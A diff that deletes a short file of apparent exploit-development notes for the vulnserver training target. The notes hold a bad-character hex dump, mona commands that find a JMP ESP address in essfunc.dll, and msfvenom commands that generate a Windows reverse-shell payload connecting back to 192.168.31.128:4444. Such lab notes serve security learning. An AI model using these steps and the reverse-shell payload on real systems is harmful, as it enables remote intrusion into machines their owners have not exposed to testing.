@@ -1,29 +1,0 @@
-00F6F9D0  09 0A 0B 0C 0D 0E 0F 10  ....
-00F6F9E0  19 1A 1B 1C 1D 1E 1F 20  
-00F6F9F0  29 2A 2B 2C 2D 2E 2F 30  )*+,-./0
-00F6FA00  39 3A 3B 3C 3D 3E 3F 40  9:;<=>?@
-00F6FA10  49 4A 4B 4C 4D 4E 4F 50  IJKLMNOP
-00F6FA20  59 5A 5B 5C 5D 5E 5F 60  YZ[\]^_`
-00F6FA30  69 6A 6B 6C 6D 6E 6F 70  ijklmnop
-00F6FA40  79 7A 7B 7C 7D 7E 7F 80  yz{|}~€
-00F6FA50  89 8A 8B 8C 8D 8E 8F 90  墛媽崕彁
-00F6FA60  99 9A 9B 9C 9D 9E 9F A0  櫄洔潪煚
-00F6FA70  A9 AA AB AC AD AE AF B0  ┆
-00F6FA80  B9 BA BB BC BD BE BF C0  购患骄坷
-00F6FA90  C9 CA CB CC CD CE CF D0  墒颂臀闲
-00F6FAA0  D9 DA DB DC DD DE DF E0  仝圮蒉哙
-00F6FAB0  E9 EA EB EC ED EE EF F0  殛腱眍镳
-00F6FAC0  F9 FA FB FC FD FE FF 00  .
-
-
-!mona modules
-
-!mona find -s "\xff\xe4" -m essfunc.dll
-
-
-Log data, item 40
- Address=625011AF
- Message=  0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\Desktop\vulnserver-master\essfunc.dll)
-
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.31.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.31.128 LPORT=4444 EXITFUNC=thread -f c -a x86 –platform windows -b "\x00"
